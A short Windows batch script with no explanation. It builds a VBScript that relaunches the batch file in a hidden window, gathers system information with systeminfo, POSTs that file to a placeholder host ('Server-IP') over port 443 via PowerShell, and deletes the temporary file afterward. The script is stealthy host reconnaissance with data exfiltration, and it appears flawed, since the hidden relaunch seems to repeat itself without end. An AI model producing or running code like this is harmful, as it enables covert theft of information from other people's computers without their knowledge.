<!-- :
@echo off
set "VBSFile=%TEMP%\run_hidden.vbs"
echo Set WshShell = CreateObject("WScript.Shell") >"%VBSFile%"
echo WshShell.Run """" ^& "%~f0" ^& """", 0 >>"%VBSFile%"
echo Set WshShell = Nothing >>"%VBSFile%"
"%VBSFile%"
exit /b
-->

systeminfo > "%TEMP%\systeminfo.txt"
powershell -command "& { Invoke-WebRequest -Uri 'http://Server-IP:443' -Method POST -InFile '%TEMP%\systeminfo.txt' }"
del "%TEMP%\systeminfo.txt"
pause
